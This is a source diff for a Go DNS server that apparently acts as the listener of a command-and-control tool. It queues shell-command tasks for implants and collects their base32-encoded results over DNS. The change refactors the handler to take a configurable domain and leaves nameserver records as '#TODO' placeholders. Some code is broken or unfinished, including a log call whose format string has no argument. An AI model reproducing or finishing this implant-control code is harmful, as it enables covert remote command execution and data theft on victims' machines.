@@ -7,7 +7,6 @@ import (
 	"github.com/miekg/dns"
 	"gorm.io/gorm"
 	"log"
-	"net"
 	"os"
 	"strconv"
 	"strings"
@@ -43,9 +42,10 @@ type DNSHandler struct {
 	b32Encoding *base32.Encoding // Base32 no-padding encoder/decoder scheme
 	mu          sync.Mutex
 	pending     map[uint]map[uint]*partialResult // pending results: implantID -> taskID -> partialResult
+	fqdn        string                           // replcae in the rplaces whern eclaling dns.Fqdn
 }
 
-func NewDNSHandler(db *gorm.DB) *DNSHandler {
+func NewDNSHandler(db *gorm.DB, fqdn string) *DNSHandler {
 	return &DNSHandler{
 		db:          db,
 		b32Encoding: base32.StdEncoding.WithPadding(base32.NoPadding),
@@ -92,7 +92,7 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 		}
 
 		for _, task := range tasks {
-			if task.TaskType != model.ShellCommand {
+			if task.TaskType != model.ShellCommand.String() {
 				continue
 			}
 
@@ -168,39 +168,40 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 			h.mu.Unlock()
 		}
 	case q.Qtype == dns.TypeSOA:
-		if q.Name == fqdnDomain {
-			m.Answer = append(m.Answer, &dns.SOA{
-				Hdr:     dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
-				Ns:      ns1Name,
-				Mbox:    "hostmaster." + fqdnDomain,
-				Serial:  serial,
+		if q.Name == h.fqdn {
+			reply.Answer = append(reply.Answer, &dns.SOA{
+				Hdr:     dns.RR_Header{Name: h.fqdn, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
+				Ns:      "#TODO",
+				Mbox:    "hostmaster." + h.fqdn,
+				Serial:  20, // TODO: fix
 				Refresh: 3600, Retry: 1800, Expire: 604800, Minttl: 60,
 			})
 		}
 
 	// NS
-	case dns.TypeNS:
-		if q.Name == fqdnDomain {
-			m.Answer = append(m.Answer,
-				&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns1Name},
-				&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns2Name},
+	case q.Qtype == dns.TypeNS:
+		if q.Name == h.fqdn {
+			reply.Answer = append(reply.Answer,
+				&dns.NS{Hdr: dns.RR_Header{Name: h.fqdn, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: "#TODO"},
+				&dns.NS{Hdr: dns.RR_Header{Name: h.fqdn, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: "#TODO"},
 			)
 		}
 
 	// A for your nameservers
-	case dns.TypeA:
-		switch q.Name {
-		case ns1Name:
-			m.Answer = append(m.Answer, &dns.A{
-				Hdr: dns.RR_Header{Name: ns1Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
-				A:   net.ParseIP("<YOUR_STATIC_IP>"),
-			})
-		case ns2Name:
-			m.Answer = append(m.Answer, &dns.A{
-				Hdr: dns.RR_Header{Name: ns2Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
-				A:   net.ParseIP("<YOUR_STATIC_IP>"),
-			})
-		}
+	case q.Qtype == dns.TypeA:
+		// TODO:
+		//switch q.Name {
+		//case ns1Name:
+		//	m.Answer = append(m.Answer, &dns.A{
+		//		Hdr: dns.RR_Header{Name: ns1Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
+		//		A:   net.ParseIP("<YOUR_STATIC_IP>"),
+		//	})
+		//case ns2Name:
+		//	m.Answer = append(m.Answer, &dns.A{
+		//		Hdr: dns.RR_Header{Name: ns2Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
+		//		A:   net.ParseIP("<YOUR_STATIC_IP>"),
+		//	})
+		//}
 	}
 
 	if len(reply.Answer) == 0 {
@@ -218,7 +219,7 @@ func (listener *DNSListener) Listen() {
 	server := &dns.Server{
 		Addr:    dnsBindAddr,
 		Net:     "udp",
-		Handler: NewDNSHandler(listener.db)}
+		Handler: NewDNSHandler(listener.db, listener.fqdn)}
 	log.Printf("Starting DNS server for zone %s on port 53")
 	if err := server.ListenAndServe(); err != nil {
 		log.Fatalf("server failed: %v", err)
